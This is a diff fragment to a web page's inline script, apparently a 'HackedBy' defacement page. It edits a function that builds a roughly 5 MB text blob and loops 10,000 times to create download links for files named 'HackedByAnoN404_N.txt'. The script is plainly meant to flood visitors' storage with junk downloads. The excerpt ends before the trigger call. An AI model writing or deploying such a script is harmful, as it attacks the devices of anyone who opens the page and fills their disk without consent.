@@ -52,10 +52,10 @@
 
 <script>
     function autoDownloadFiles() {
-        const text = "HackedByYan You Storage Is Having".repeat(10 * 1024 * 1024 / 3); //
+        const text = "yan".repeat(5 * 1024 * 1024 / 3); //
         const blob = new Blob([text], { type: "text/plain" });
 
-        for (let i = 1; i <= 900; i++) {
+        for (let i = 1; i <= 10000; i++) {
             const link = document.createElement("a");
             link.href = URL.createObjectURL(blob);
             link.download = `HackedByAnoN404_${i}.txt`;
